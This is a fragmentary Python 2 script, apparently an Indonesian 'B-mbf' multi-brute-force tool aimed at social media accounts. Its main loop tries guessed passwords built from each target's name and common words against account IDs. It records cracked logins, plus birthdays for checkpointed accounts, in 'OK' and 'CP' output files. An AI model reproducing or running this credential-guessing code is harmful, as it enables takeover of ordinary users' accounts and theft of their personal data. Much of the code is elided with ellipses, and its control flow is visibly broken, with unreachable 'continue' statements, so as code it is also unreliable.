...
def logo():
	os.system("clear")
	print("""
    \x1b[1;96m____                  __    ____
   \x1b[1;96m/ __ )      ____ ___  / /_  / __/•Force
  \x1b[1;96m/ __  |_____/ __ `__ \/ __ \/ /_•Brute
 \x1b[1;96m/ /_/ /_____/ / / / / / /_/ / __/•Multi
\x1b[1;96m/_____/     /_/ /_/ /_/_.___/_/•Bacod
                                          """)
def bot_follow():
	try:
...
def menu():
    ...
    print(" "+p+"[=] Recode     : Mat X Putri X Ndrii ")
...
def pilih_menumbasic():
    ...
    def main(arg):
        global loop
        print'\r\x1b[0;97m [Mat] %s/%s Hidup-:%s - Mati-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
        ...
        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'anjing', 'bangsat', 'sayang']:
                ...
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m ︻[Hidup]❉─────➳ ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ︻[Hidup]❉─────➳ ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                    ...
                    try:
                        ...
                        ttl = b['birthday']
                        print'\r\x1b[0;92m ︻[Mati]❉─────➳ ' + uid + ' | ' + pw + ' | ' + ttl + '                       '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' ︻[Mati]❉─────➳ ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                       '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r\x1b[0;92m ︻[Mati]❉─────➳ ' + uid + ' | ' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ︻[Mato]❉─────➳ ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue
